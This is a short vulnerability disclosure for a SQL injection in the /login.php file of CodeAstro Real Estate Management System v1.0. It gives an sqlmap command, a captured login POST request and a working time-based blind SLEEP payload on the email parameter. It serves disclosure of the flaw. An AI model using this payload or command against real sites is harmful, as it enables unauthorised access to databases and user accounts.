# SQLi vulnerability in CodeAstro Real Estate Management System v1.0 of file /login.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /login.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```http
POST /login.php HTTP/1.1
Host: www.realestate.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
Cache-Control: max-age=0
Origin: http://www.realestate.com
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=d4bb5bt4089bi920s8gj8fb0np
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://www.realestate.com/login.php
Content-Length: 47

email=admin%40gmail.com&pass=123456&login=Login
```





```
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=admin@gmail.com' AND (SELECT 1267 FROM (SELECT(SLEEP(5)))xRPM)-- zTVO&pass=123456&login=Login
---
```





![image-20250602120035128](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202506021200216.png)